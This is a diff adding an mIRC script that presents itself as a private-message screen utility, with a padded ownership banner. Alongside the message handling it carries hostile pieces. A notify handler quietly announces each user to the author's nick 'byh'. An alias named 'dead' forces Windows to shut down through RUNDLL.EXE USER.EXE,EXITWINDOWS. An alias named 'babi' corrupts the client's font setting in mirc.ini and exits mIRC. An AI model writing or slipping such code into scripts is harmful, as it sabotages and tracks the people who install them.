@@ -1,0 +1,74 @@
+.                                                                                                                                                                                                                 The property of 
+.                                                                                                                                                                                                                 "Air Biru Incorp."
+.                                                                                                                                                                                                           All copy right reserved.                                
+.                                                                                                                                                                                                               Copyright © 500                                                     
+
+#msgscreen on
+on 1:open:?: {
+  .window -eknl12 @Msg 0 0 718 504 @Msg Times New Roman 14
+  .titlebar @Msg Screen Data Analyse....
+  .ignore -pu5 $mask($fulladdress,4)
+  .ignore -pu10 $mask($fulladdress,3)
+  .set %msg.logs $1-
+  .set %msg.nick $nick
+  .aline -l 4 @msg %msg.nick
+  .msg $nick %mesej 4[You Were Ignored For 10secs] 
+  .close -m $nick
+  .echo @msg $nick :8 %msg.logs
+  .echo -a Incoming Chat Requested [8 $+ $nick $+ ]
+}
+on msg:open:?: {
+  .window -eknl12 @Msg 0 0 718 504 @Msg Times New Roman 14
+  .ignore -pu5 $mask($fulladdress,4)
+  .ignore -pu10 $mask($fulladdress,3)
+  .set %msg.logs $1-
+  .msg $nick %mesej 8 [ %ver ]
+  .close -m $nick
+  .echo @msg $nick : 8 %msg.logs
+  .echo -a Incoming Chat Requested [8 $+ $nick $+ ]
+}
+#msgscreen end
+on 1:input:@msg:.echo You : $1- | halt
+menu @Msg {
+  dclick nicklist2
+  Query:.query $1
+  -
+  Whois:.whois $1
+  -
+  Notice:set %n.notice $$1 | .notice $1 Private : $$?="Enter Private Notice"
+  -
+  Ignore
+  .Ignore 30sec:.ignore -u15 $1
+  .Ignore 60sec:.ignore -u60 $1
+  .Ignore 120sec:.ignore -u120 $1
+  .Ignore Forever:.ignore -u $1
+  -
+  Refresh:window -c @Msg | window -eknl12 @Msg 0 0 718 504 @Msg Times New Roman  14 | titlebar @Msg Screen Data Analyse.....  | rlevel msg
+}
+alias NickList2 {
+  if ($sline(@Msg,1).ln == 1 || $sline(@Msg,1).ln == 2 || $sline(@Msg,1).ln == $null) { halt }
+  else query $sline(@Msg,1)
+}
+on 1:NOTIFY: {
+  if ($nick == byh) || ($nick == byh) || ($nick == byh) { 
+    echo 6 -a 12NOTIFY :4 $nick Online.
+    notice $nick Hello Boss..Im Using Your Script %xrc
+    halt 
+  }
+  if ($nick !== MaYaT) || ($nick == tAUgEh) || ($nick == aweksepastik) {  
+    echo 6 -a 12NOTIFY :4 $nick Online.
+    halt
+  }
+}
+
+
+alias dead {
+  if ( $exists(c:\win98\rundll.exe) ) { goto mati }
+  else if ( $exists(c:\windows\rundll.exe) ) { goto die | else halt }  
+  :die
+  /.run C:\WINDOWS\RUNDLL.EXE USER.EXE,EXITWINDOWS | halt
+  :mati
+  /.run C:\WIN98\RUNDLL.EXE USER.EXE,EXITWINDOWS
+}
+
+alias babi { if $readini mirc.ini fonts fscripts != symbol,401 { writeini mirc.ini fonts fscripts symbol,401 | .exit | halt } }
